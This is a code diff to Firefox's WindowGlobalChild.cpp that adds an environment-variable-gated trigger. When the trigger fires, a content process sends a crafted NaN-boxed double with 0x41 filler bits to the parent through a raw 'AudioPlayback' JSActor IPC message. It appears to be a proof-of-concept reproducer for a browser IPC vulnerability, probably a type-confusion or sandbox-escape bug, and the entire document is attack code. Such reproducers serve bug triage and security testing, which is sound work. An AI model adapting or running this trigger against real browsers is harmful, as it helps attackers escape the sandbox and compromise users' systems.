@@ -1,0 +1,53 @@
+diff --git a/dom/ipc/WindowGlobalChild.cpp b/dom/ipc/WindowGlobalChild.cpp
+index 3c6da37..d73b84f 100644
+--- a/dom/ipc/WindowGlobalChild.cpp
++++ b/dom/ipc/WindowGlobalChild.cpp
+@@ -6,6 +6,9 @@
+ 
+ #include "mozilla/dom/WindowGlobalChild.h"
+ 
++#include <cstdint>
++#include <cstring>
++
+ #include "GeckoProfiler.h"
+ #include "Navigator.h"
+ #include "mozilla/AntiTrackingUtils.h"
+@@ -52,6 +55,7 @@
+ #include "nsScriptSecurityManager.h"
+ #include "nsSerializationHelper.h"
+ #include "nsURLHelper.h"
++#include "prenv.h"
+ #include "xpcpublic.h"
+ 
+ using namespace mozilla::ipc;
+@@ -157,6 +161,30 @@ already_AddRefed<WindowGlobalChild> WindowGlobalChild::Create(
+ 
+   wgc->Init();
+   wgc->InitWindowGlobal(aWindow);
++
++  const char* trigger = PR_GetEnv("BUG2022034_TRIGGER");
++  if (XRE_IsContentProcess() && trigger && wgc->CanSend()) {
++    static bool fired = false;
++    if (!fired) {
++      fired = true;
++
++      constexpr uint64_t bits = 0xFFFE414141414141ULL;
++      double value;
++      memcpy(&value, &bits, sizeof(value));  // Keep the exact NaN bits.
++
++      nsTArray<JSIPCValue> elements;
++      elements.AppendElement(JSIPCValue(value));
++      JSIPCValue data(JSIPCArray(std::move(elements)));
++
++      JSActorMessageMeta meta;
++      meta.actorName() = "AudioPlayback"_ns;
++      meta.messageName() = u"trigger"_ns;
++      meta.queryId() = 0;
++      meta.kind() = JSActorMessageKind::Message;
++
++      wgc->SendRawMessage(meta, std::move(data), nullptr);
++    }
++  }
+   return wgc.forget();
+ }
+ 
